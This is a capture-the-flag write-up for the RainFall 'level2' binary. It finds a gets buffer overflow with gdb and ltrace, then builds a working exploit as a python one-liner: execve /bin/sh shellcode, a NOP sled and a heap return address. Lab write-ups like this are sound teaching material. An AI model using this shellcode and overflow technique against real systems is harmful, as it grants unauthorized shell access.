First we start by open the file in [dogbolt](https://dogbolt.org/). We can see that it use the `gets` function which is vulnerable to overflow attacks.

Here we see that we have to get a shellcode to launch a shell. We can use [shell-storm](https://shell-storm.org/shellcode/index.html) :

We use a pattern like the previous level:
`aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz`

```
(gdb) r
Starting program: /home/user/level2/level2
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppuuuurrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x75757575 in ?? ()
(gdb) x/s $esp
0xbffff720:      "vvvvwwwwxxxxyyyyzzzz"
```

26-5=21</br>
21\*4=84

Now to find the return address we will use ltrace on the file:

```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                                                                                 = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
)                                                                                                      = 0xbffff6fc
puts(""
)                                                                                                                                           = 1
strdup("")                                                                                                                                         = 0x0804a008
+++ exited (status 8) +++
```

Here we can see that the strdup use the address 0x0804a008 (address from the buffer)
When transform in little endian and hex: \x08\xa0\x04\x08

84-size(shellcode) : 84 - 21= 63
63-size(address) : 63 - 4 = 59

So now we know that our exploit will be compose by :
[21 char of shellcode][a 59 nop sled][4 bytes address]

python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" \* 59 + "\x08\xa0\x04\x08"' > /tmp/test3
